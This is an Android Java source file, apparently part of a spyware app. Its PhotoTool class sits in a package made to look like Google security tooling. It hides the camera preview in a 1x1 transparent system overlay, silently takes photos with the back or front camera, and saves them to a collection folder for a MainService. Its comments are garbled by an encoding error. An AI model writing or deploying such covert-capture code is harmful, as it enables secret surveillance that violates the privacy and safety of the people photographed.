package com.google.security.tools;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import com.google.security.FinishReceiver;
import com.google.security.MainService;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.AutoFocusCallback;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.PictureCallback;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

/*
 * Function�����չ����࣬������ͷ���ղ����浽����Ŀ¼��
 * Author��   RongRong
 * Create Date: 201511.11
 * Update Date��
 * */
public class PhotoTool {
	private static final String LOGTAG = "PhotoTool";
	private static PhotoTool photoTool;
	private Context context;
	private SurfaceView mySurfaceView;
	private SurfaceHolder myHolder;
	private Camera myCamera;
	private Thread thread;
	private WindowManager wm;

	private PhotoTool(Context context) {
		this.context = context;

	}

	public static PhotoTool getIntance(Context context) {
		if (photoTool == null)
			return new PhotoTool(context);
		return photoTool;
	}

	public void start() {
		try {
			initSurface();
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		// ����ÿ��߳̽������գ���ΪActivity��δ��ȫ��ʾ��ʱ�����޷��������յģ�SurfaceView��������ʾ
		thread = new Thread(new Runnable() {
			@Override
			public void run() {

				// ��ʼ��camera���Խ�����
				try {
					initCamera();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		thread.start();

	}

	public void stop() {// ֹͣ���պ���
		myCamera.release();
		wm.removeView(mySurfaceView);

	}

	private void initSurface() {
		// ��ʼ��surfaceview
		mySurfaceView = new SurfaceView(context);

		wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);

		WindowManager.LayoutParams params = new WindowManager.LayoutParams(1,
				1, WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
				WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
						| WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
				PixelFormat.TRANSPARENT);
		params.gravity = Gravity.TOP | Gravity.RIGHT;
		params.alpha = PixelFormat.TRANSPARENT;

		params.x = params.y = 1;
		wm.addView(mySurfaceView, params);

		// ��ʼ��surfaceholder
		myHolder = mySurfaceView.getHolder();
		myHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

	}

	// ��ʼ������ͷ
	private void initCamera() {

		// �����������ͷ
		if (checkCameraHardware(context)) {
			// ��ȡ����ͷ����ѡǰ�ã���ǰ��ѡ���ã�
			if (openFacingBackCamera()) {
				Log.e(LOGTAG, "openCameraSuccess");
				// ���жԽ�
				autoFocus();
			} else {
				Log.e(LOGTAG, "openCameraFailed");
			}

		}
	}

	// �Խ�������
	private void autoFocus() {

		try {
			// ��Ϊ��������ͷ��Ҫʱ�䣬�������߳�˯����
			Thread.sleep(3000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		// �Զ��Խ�
		try {
			myCamera.autoFocus(myAutoFocus);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		// �Խ�������
		try {
			myCamera.takePicture(null, null, myPicCallback);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// �ж��Ƿ��������ͷ
	private boolean checkCameraHardware(Context context) {

		if (context.getPackageManager().hasSystemFeature(
				PackageManager.FEATURE_CAMERA)) {
			// �豸��������ͷ
			return true;
		} else {
			// �豸����������ͷ
			return false;
		}

	}

	// �õ���������ͷ
	private boolean openFacingBackCamera() {

		// ���Կ���ǰ������ͷ
		CameraInfo cameraInfo = new CameraInfo();
		for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo);
			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
				try {

					Log.e(LOGTAG, "tryToOpenCamera");
					myCamera = Camera.open(camIdx);
					Camera.Parameters parameters = myCamera.getParameters(); // ��ȡ�������

					parameters.setPictureFormat(PixelFormat.JPEG); // ָ��ͼƬΪJPEGͼƬ
					parameters.set("jpg-quality", 80); // ����ͼƬ������
					parameters.setPictureSize(640, 480); // ��������ͼƬ�ĳߴ�
					myCamera.setParameters(parameters); // ���������������
				} catch (RuntimeException e) {
					e.printStackTrace();
					return false;
				}
			}
		}

		// �������ǰ��ʧ�ܣ��޺��ã�����ǰ��
		if (myCamera == null) {
			for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
				Camera.getCameraInfo(camIdx, cameraInfo);
				if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
					try {
						myCamera = Camera.open(camIdx);
						Camera.Parameters parameters = myCamera.getParameters(); // ��ȡ�������
						parameters.setPictureSize(640, 480); // ����Ԥ������ĳߴ�
						parameters.setPictureFormat(PixelFormat.JPEG); // ָ��ͼƬΪJPEGͼƬ
						parameters.set("jpg-quality", 85); // ����ͼƬ������
						parameters.setPictureSize(640, 480); // ��������ͼƬ�ĳߴ�
						myCamera.setParameters(parameters); // ���������������
					} catch (RuntimeException e) {
						e.printStackTrace();
						return false;
					}
				}
			}
		}

		try {
			// �����myCameraΪ�Ѿ���ʼ����Camera����
			myCamera.setPreviewDisplay(myHolder);
		} catch (IOException e) {
			e.printStackTrace();
			myCamera.stopPreview();
			myCamera.release();
			myCamera = null;

		}

		myCamera.startPreview();

		return true;
	}

	// �Զ��Խ��ص�����(��ʵ��)
	private AutoFocusCallback myAutoFocus = new AutoFocusCallback() {
		@Override
		public void onAutoFocus(boolean success, Camera camera) {
		}
	};

	// ���ճɹ��ص�����
	private PictureCallback myPicCallback = new PictureCallback() {

		@Override
		public void onPictureTaken(byte[] data, Camera camera) {
			// ������պ�ر�Activity

			// ���õ�����Ƭ����90����ת��ʹ����ֱ
			Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
			Matrix matrix = new Matrix();
			matrix.preRotate(90);
			bitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(),
					bitmap.getHeight(), matrix, true);

			// ����������ͼƬ�ļ�
			// SimpleDateFormat dateFormat = new
			// SimpleDateFormat("yyyymmddhhmmss");
			// String date = dateFormat.format(new Date());

			File pictureFile = new File(getDir(), System.currentTimeMillis()
					/ 1000 + ".jpg");
			try {
				FileOutputStream fos = new FileOutputStream(pictureFile);
				bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
				fos.close();
			} catch (Exception error) {
				Log.e(LOGTAG, "������Ƭʧ��" + error.toString());
				error.printStackTrace();
				myCamera.stopPreview();
				myCamera.release();
				myCamera = null;

			}

			Log.e(LOGTAG, "��ȡ��Ƭ�ɹ�");
			// Toast.makeText(context, "��ȡ��Ƭ�ɹ�", Toast.LENGTH_SHORT).show();

			// if(file.list().length!=0){

			// }
			myCamera.stopPreview();
			myCamera.release();
			myCamera = null;

			while (true) {
				File file = new File(MainService.PHOTO_FORDER_PATH);
				if (file.list().length != 0) {
					FinishReceiver.finishbroadcast("photo", context);
					break;
				}
			}
		}
	};

	// ��ȡ�ļ���

	private File getDir() {
		// �õ�SD����Ŀ¼

		File dir = new File(MainService.PHOTO_FORDER_PATH);
		// Environment.getExternalStorageDirectory();

		if (dir.exists()) {
			return dir;
		} else {
			dir.mkdirs();
			return dir;
		}
	}
}
